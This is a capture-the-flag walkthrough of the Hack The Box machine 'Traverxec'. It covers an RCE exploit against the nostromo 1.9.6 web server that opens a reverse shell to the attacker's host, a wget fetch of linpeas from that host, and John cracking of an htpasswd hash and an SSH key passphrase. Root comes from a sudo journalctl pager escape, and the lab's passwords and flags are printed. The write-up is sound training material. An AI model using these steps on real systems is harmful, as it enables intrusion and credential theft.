# [04 - Traverxec](https://app.hackthebox.com/machines/Traverxec)

![Traverxec.png](Traverxec.png)

## description
> 10.10.10.165

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- traverxec.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-20 20:05 MDT
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.057s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

22 and 80. `nostromo`?

### 80

> Hello my name is David White.
> I create for the web.

pretty basic business for a website. see in calls to `/lib` almost certainly backed by PHP

there is a contact form
```
POST /empty.html HTTP/1.1
Host: traverxec.htb
User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Tesla_SP9_2 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 (Mobile; afma-sdk-a-v210402999.201004000.1)
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 73
Origin: http://traverxec.htb
Connection: close
Referer: http://traverxec.htb/

name=name&email=me%40mine.com&subject=subject&message=message+in+a+bottle
```

gets `No mail sent. Not yet finished. Please come back soon!`

```
msf6 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)

...
msf6 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.14.9:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.9:4445 -> 10.10.10.165:49436) at 2022-07-20 20:12:22 -0600

id -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

nice, a foothold

### www-data on up

```
pwd
/usr/bin
ls -la /var/www/html
ls -la /var/www
ls -la /home/
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
```

ok, his name is david

```
cat /etc/resolv.conf
domain localdomain
search localdomain
nameserver 10.211.55.1

find / -iname 'nhttpd*' 2>/dev/null
/usr/local/sbin/nhttpd
/usr/share/man/man8/nhttpd.8
/var/nostromo/logs/nhttpd.pid
/var/nostromo/conf/nhttpd.conf

ls -laR /var/nostromo
/var/nostromo:
total 24
drwxr-xr-x  6 root     root   4096 Oct 25  2019 .
drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..
drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf
drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs
drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons
drwxr-xr-x  2 www-data daemon 4096 Jul 20 22:02 logs

/var/nostromo/conf:
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
```

```
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

time for some john

```
$ john_rockyou htpasswd
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:19 26.22% (ETA: 20:28:40) 0g/s 204422p/s 204422c/s 204422C/s se7en1287..sdnuorwi93
0g 0:00:00:45 62.59% (ETA: 20:28:39) 0g/s 196511p/s 196511c/s 196511C/s codycagle..codie77
Nowonly4me       (david)
```

ssh? no

```
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

### linpeas

having some problems with this basic shell, eventually got linpeas.sh downloaded with
```
wget http://10.10.14.9:7777/linpeas.sh -O /tmp/linpeas.sh 2>&1
--2022-07-21 12:42:18--  http://10.10.14.9:7777/linpeas.sh
Connecting to 10.10.14.9:7777... connected.
HTTP request sent, awaiting response... 200 OK
...
```

```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.27

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=b94f39a4-394e-4755-bdc1-205c141583a6 /               ext4    errors=remount-ro 0       1
UUID=4694341c-5642-4505-8593-0e44d799f109 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

```

not seeing much here.

### HOMEDIRS

back to the nostromo config, we've got a username and password, but nowhere to use it.

from [https://www.nazgul.ch/dev/nostromo_man.html](https://www.nazgul.ch/dev/nostromo_man.html):
```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.
```

and sure enough, `http://traverxec.htb/~david/` gives us new content
> Private space.
> Nothing here.
> Keep out!

me thinks the lady doth protest too much.

but.. `http://traverxec.htb/~david/user.txt` is 404

as are `.ssh/id_dsa` and `.ssh/id_rsa`

we're not getting prompted for auth, or seeing 403s

the last line from the `HOMEDIRS` documentation missing from above is
```
     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

so what we're seeing is not `/home/david`, it's `/home/david/public_www`

path traversal? no, we don't have a param, only the URI.

```
ls /home/david/public_www/
index.html
protected-file-area
```

ok - and that gives us an auth prompt

and [backup-ssh-identity-files.tgz](backup-ssh-identity-files.tgz), which.. is going to have a key.

```
Path = backup-ssh-identity-files.tar
Type = tar
Physical Size = 10240
Headers Size = 7168
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-10-25 15:02:50 D....            0            0  home/david/.ssh
2019-10-25 15:02:50 .....          397          512  home/david/.ssh/authorized_keys
2019-10-25 15:02:21 .....         1766         2048  home/david/.ssh/id_rsa
2019-10-25 15:02:44 .....          397          512  home/david/.ssh/id_rsa.pub
------------------- ----- ------------ ------------  ------------------------
```

indeed it is.

```
$ ssh -i home/david/.ssh/id_rsa -l david traverxec.htb
Warning: Permanently added 'traverxec.htb,10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'home/david/.ssh/id_rsa':
```

ok, more john first.

```
$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa > david_rsa.hash
$ john_rockyou david_rsa.hash
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
1g 0:00:00:00 DONE (2022-07-22 16:42) 25.00g/s 6400p/s 6400c/s 6400C/s carolina..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

real    0m3.154s
user    0m27.617s
sys     0m0.136s
```

i'll allow it.

```
$ ssh -i home/david/.ssh/id_rsa -l david traverxec.htb
Warning: Permanently added 'traverxec.htb,10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'home/david/.ssh/id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```

nice.

### pivot

```
david@traverxec:~$ crontab -l
no crontab for david
david@traverxec:~$ sudo -l
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
sudo: 2 incorrect password attempts
```

password is not `Nowonly4me` or `hunter`, moving on

```
david@traverxec:~$ ls -l /opt
total 0
david@traverxec:~$ ls -l /tmp
total 12
drwx------ 3 root root 4096 Jul 22 18:37 systemd-private-b11fbee206fd4cdab1940344c9ddf71e-systemd-timesyncd.service-xmgukP
drwx------ 2 root root 4096 Jul 22 18:37 vmware-root
drwx------ 2 root root 4096 Jul 22 18:37 vmware-root_622-2689275054
david@traverxec:~$ ls -l /mnt
total 0
```

linpeas it is

```
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

...

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

...

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
You own the script: /home/david/bin/server-stats.sh
/usr/bin/gettext.sh

```

ok, so `server-stats.sh` looks like the way forward

```
david@traverxec:~$ ls -l bin/
total 8
-r-------- 1 david david 802 Oct 25  2019 server-stats.head
-rwx------ 1 david david 363 Oct 25  2019 server-stats.sh
david@traverxec:~$ cat bin/server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

unclear when it runs, and that `sudo` has to mean we have NOPASSWD access to at least `journalctl`

```
david@traverxec:~$ bash bin/server-stats.sh
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

Load:  18:56:30 up 19 min,  1 user,  load average: 0.00, 0.01, 0.00

Open nhttpd sockets: 0
Files in the docroot: 117

Last 5 journal log lines:
-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:56:30 EDT. --
Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
Jul 22 18:37:18 traverxec nhttpd[438]: started
Jul 22 18:37:18 traverxec nhttpd[438]: max. file descriptors = 1040 (cur) / 1040 (max)
Jul 22 18:37:18 traverxec systemd[1]: Started nostromo nhttpd server.

```

confirmed

and gtfobins [https://gtfobins.github.io/gtfobins/journalctl/](https://gtfobins.github.io/gtfobins/journalctl/) says

`sudo journalctl`
`!/bin/sh`

but
```
david@traverxec:~$ sudo journalctl
[sudo] password for david:
david@traverxec:~$ sudo /usr/bin/journalctl
[sudo] password for david:
david@traverxec:~$
david@traverxec:~$ sudo /usr/bin/journalctl -n5
[sudo] password for david:
david@traverxec:~$ sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:58:20 EDT. --
Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
Jul 22 18:37:18 traverxec nhttpd[438]: started
Jul 22 18:37:18 traverxec nhttpd[438]: max. file descriptors = 1040 (cur) / 1040 (max)
Jul 22 18:37:18 traverxec systemd[1]: Started nostromo nhttpd server.
```

the sudo entry is very targeted

but..

> This invokes the default pager, which is likely to be less, other functions may apply.

so, make the window very small, and then
```
david@traverxec:~$ sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:59:25 EDT. --
Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
!/bin/sh
# id -a
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
9aa36a6d76f785dfd320a478f6e0d906
```

root down.

## flag
```
user:7db0b48469606a42cec20750d9782f3d
root:9aa36a6d76f785dfd320a478f6e0d906
```
